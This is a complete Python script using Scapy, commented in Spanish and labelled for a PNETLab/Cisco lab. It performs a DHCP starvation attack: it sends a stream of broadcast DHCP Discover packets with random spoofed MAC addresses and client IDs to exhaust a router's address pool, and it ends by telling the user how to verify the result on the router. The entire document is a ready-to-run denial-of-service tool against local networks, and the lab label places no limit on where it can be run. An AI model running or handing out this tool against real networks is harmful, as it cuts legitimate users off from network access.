#!/usr/bin/env python3
"""
DHCP Starvation Attack Script - Versión Corregida
================================================
Entorno: Laboratorio PNETLab / Cisco vIOS
"""

from scapy.all import *
import argparse
import random
import time
import os
import sys

# Desactivar advertencias de Scapy para una salida limpia
conf.verb = 0

class DHCPStarvation:

    def __init__(self, interface, count, delay):
        self.interface = interface
        self.count = count
        self.delay = delay
        self.sent = 0

    def random_mac(self):
        """Genera una MAC aleatoria con el bit local administrado activo."""
        return "02:%02x:%02x:%02x:%02x:%02x" % (
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255)
        )

    def build_discover(self, mac):
        """Construye el paquete DHCP Discover con todas las capas necesarias."""
        # Capa 2: Ethernet
        ether = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")

        # Capa 3: IP (Indispensable para que el router procese el broadcast)
        ip = IP(src="0.0.0.0", dst="255.255.255.255")

        # Capa 4: UDP
        udp = UDP(sport=68, dport=67)

        # BOOTP: chaddr debe tener 16 bytes (6 de MAC + 10 de padding)
        mac_bytes = bytes.fromhex(mac.replace(':', ''))
        chaddr = mac_bytes + b'\x00' * 10

        bootp = BOOTP(
            chaddr=chaddr,
            xid=random.randint(1, 0xFFFFFFFF),
            flags=0x8000  # Broadcast flag para asegurar respuesta
        )

        # DHCP Options: Discover
        dhcp = DHCP(options=[
            ("message-type", "discover"),
            ("client_id", b'\x01' + mac_bytes), # Ayuda a que el router identifique clientes únicos
            "end"
        ])

        return ether / ip / udp / bootp / dhcp

    def run(self):
        print("=" * 60)
        print(" 🔥 INICIANDO DHCP STARVATION ATTACK")
        print(f" [*] Interfaz : {self.interface}")
        print(f" [*] Objetivos: {self.count} paquetes")
        print(f" [*] Delay    : {self.delay}s")
        print("=" * 60)

        try:
            for i in range(self.count):
                mac = self.random_mac()
                pkt = self.build_discover(mac)

                sendp(pkt, iface=self.interface, verbose=False)
                self.sent += 1

                if self.sent % 10 == 0:
                    print(f"[+] DISCOVER enviados: {self.sent}")

                time.sleep(self.delay)

        except KeyboardInterrupt:
            print("\n[!] Ataque interrumpido por el usuario.")
        except Exception as e:
            print(f"\n[!] Error: {e}")

        print("\n" + "=" * 60)
        print(f" [✓] Total enviado: {self.sent}")
        print(" [!] Verifica en el router con: show ip dhcp binding")
        print("=" * 60)


def main():
    parser = argparse.ArgumentParser(description="Herramienta de Starvation DHCP para Lab")
    parser.add_argument("-i", "--interface", required=True, help="Interfaz (ej: eth0)")
    parser.add_argument("-c", "--count", type=int, default=254, help="Cantidad de IPs a agotar")
    parser.add_argument("-d", "--delay", type=float, default=0.05, help="Delay entre paquetes")

    args = parser.parse_args()

    if os.geteuid() != 0:
        print("\n[!] Error: Debes ejecutar este script con privilegios de ROOT (sudo).\n")
        sys.exit(1)

    attack = DHCPStarvation(args.interface, args.count, args.delay)
    attack.run()

if __name__ == "__main__":
    main()
